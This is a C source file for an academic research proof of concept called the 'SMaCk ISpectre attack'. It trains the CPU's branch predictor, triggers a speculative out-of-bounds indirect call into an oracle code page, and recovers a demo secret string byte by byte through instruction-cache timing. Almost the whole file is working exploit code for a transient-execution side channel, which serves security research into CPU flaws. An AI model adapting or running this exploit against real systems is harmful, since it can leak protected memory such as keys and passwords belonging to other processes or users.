/*
 * SMaCk ISpectre attack
 * 
 * authors: 
 * Seonghun Son <seonghun@iastate.edu>
 * Daniel Moghimi <danielmm@googl.com>
 * Berk Gulmezoglu <bgulmez@iastate.edu>
 * 
 * Description:
 * ISpectre attack toolkit utilizing SMC behavior 
 * 
 */

#include "header.h"
#include <fcntl.h>
#include "cacheutils.h"
#include <time.h>

#define ICACHE

void waste_cycle(uint64_t n){
    for(uint64_t i = 0; i < n; i++);
}

void warmup(){    
    waste_cycle(1000000);
}


#define CACHE_LINE_SIZE	1024 
#define ICACHE_LINE_SIZE 64
#define LIMIT 32
unsigned char notsecret [LIMIT] = "ABCD";
unsigned char secret [] = "VVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRETVVVSONSEONGHUNSECRET";

//throttle array to maximize window size
unsigned char throttle[8 * 4096];

int64_t timespecDiff(struct timespec *timeA_p, struct timespec *timeB_p)
{
  return ((timeA_p->tv_sec * 1000000000) + timeA_p->tv_nsec) -
           ((timeB_p->tv_sec * 1000000000) + timeB_p->tv_nsec);
}

void access_code_page(uint32_t index, uint32_t length){
    flush(&length);
    flush(&index);
    for (int i = 0; i < 8; i++) {
        flush(throttle + i * 4096);
    }
    mfence();

    waste_cycle(100);

    // Throttle array elements 
    if((index / throttle[0] / throttle[4096] / throttle[2 * 4096] / throttle[3 * 4096]) < 
        (length / throttle[4 * 4096] / throttle[5 * 4096] / throttle[6 * 4096] / throttle[7 * 4096])) {
                
        //Instruction cache indrect function call        
        asm volatile(
            "call *%0\n" 
        : : "c"(oracle_code_page + notsecret[index] * CACHE_LINE_SIZE) : "rax");

    }
}


int main(int argc, char **argv)
{
    if (argc < 4) {
        printf("Usage: %s <Function_name> <Iteration> <Anomaly>\n", argv[0]);
        return 1; 
    }
    //Iteration of Spectre attack
    int ITER = atoi(argv[2]);

    //Noise value
    int ANOMALY = atoi(argv[3]);


    //For memory access of STORE and Lock
    mprotect((uint64_t *)oracle_code_page, 16384*64, PROT_READ|PROT_WRITE|PROT_EXEC);
    
    struct timespec start, end;
    uint64_t * tSamples = malloc(sizeof(uint64_t) * ITER);
    memset(tSamples, 0, sizeof(uint64_t) * ITER);
    
    
    for (int j = 0; j < 8; j++) {
        throttle[j * 4096] = 1;
    }
   

    char character;
    clock_gettime(CLOCK_MONOTONIC, &start);
    for(uint32_t s = 0; s < strlen(secret); s++){
    	// To find the max and min value
	uint64_t highest = 0;
	uint64_t lowest = 1000;

	//iterate A to Z
        for(uint32_t c = 'A'; c <= 'Z'; c++){
	    // iteration
            for(uint32_t i = 0; i < ITER; i++){
		//mistrain in-bound
                for(uint32_t t = 0; t < 8; t++){
                    access_code_page(t%LIMIT, LIMIT);
		}
                //flush cache line
		flush_oracle(c * CACHE_LINE_SIZE);
                access_code_page(LIMIT+s, LIMIT);
	    	
		// out-of-bound
		if(strcmp(argv[1],"load") == 0){
			uint64_t t = load_time(c* CACHE_LINE_SIZE);
			tSamples[i] = t;
		}
		else if(strcmp(argv[1],"flush") == 0){
                        uint64_t t = flush_time(c* CACHE_LINE_SIZE);
                        tSamples[i] = t;
                }
		else if(strcmp(argv[1],"flushopt") == 0){
                        uint64_t t = flushopt_time(c* CACHE_LINE_SIZE);
                        tSamples[i] = t;
                }else if(strcmp(argv[1],"store") == 0){
                        uint64_t t = store_time(c* CACHE_LINE_SIZE);
                        tSamples[i] = t;
                }else if(strcmp(argv[1],"lock") == 0){ 
                        uint64_t t = lms_time(c* CACHE_LINE_SIZE);
                        tSamples[i] = t;
                }else if(strcmp(argv[1],"prefetch") == 0){ 
                        uint64_t t = prefetch_time(c* CACHE_LINE_SIZE);
                        tSamples[i] = t;
                }else if(strcmp(argv[1],"prefetchnta") == 0){ 
                        uint64_t t = prefetchnta_time(c* CACHE_LINE_SIZE);
                        tSamples[i] = t;
                }else if(strcmp(argv[1],"execute") == 0){ 
                        uint64_t t = exec_time(c* CACHE_LINE_SIZE);
                        tSamples[i] = t;
                }else if(strcmp(argv[1],"clwb") == 0){ 
                        uint64_t t = clwriteback_time(c* CACHE_LINE_SIZE);
                        tSamples[i] = t;
	       	}else{
			fprintf(stdout, "Unkown function: %s\n", argv[1]);
			fflush(stdout);
		}
           }

	    //SUMC should be more than 0
            uint64_t sum = 0, sumc = 1;
            for(uint32_t i = 0; i < ITER; i++){

                if(tSamples[i] < ANOMALY){
                    sum += tSamples[i];
                    sumc ++;
                }
		//fprintf(stdout,"%lu\n",sum/sumc);
		//fflush(stdout);
            }
	    //printf("char = %c --> %lu\n",c,sum/sumc);
	    

	    // This depends on the SMC occurance based on the different microachiectrue (Table 2)
	    if(strcmp(argv[1],"flush") == 0 || strcmp(argv[1],"flushopt") == 0|| strcmp(argv[1],"store") == 0 || strcmp(argv[1],"lms") == 0 || strcmp(argv[1],"prefetch") == 0 || strcmp(argv[1],"clwb") == 0) {
		    if(sum/sumc > highest)
		    {
			     highest = sum/sumc;
			     character = c;
		    }
	    }
	    else if(strcmp(argv[1],"load") == 0 || strcmp(argv[1],"prefetchnta") == 0 || strcmp(argv[1],"execute") == 0){
		    if(sum/sumc <lowest){
			    lowest = sum/sumc;
			    character = c;
		    }

	    }else{return 0;}
        }
	fprintf(stdout, "%c ", character);
        fflush(stdout);
	
    }
    clock_gettime(CLOCK_MONOTONIC, &end);
    uint64_t timeElapsed = timespecDiff(&end, &start);
    fprintf(stdout, "\ntime elapsed = %ld ms\n", timeElapsed/1000000);
    fflush(stdout);
    free(tSamples);
}
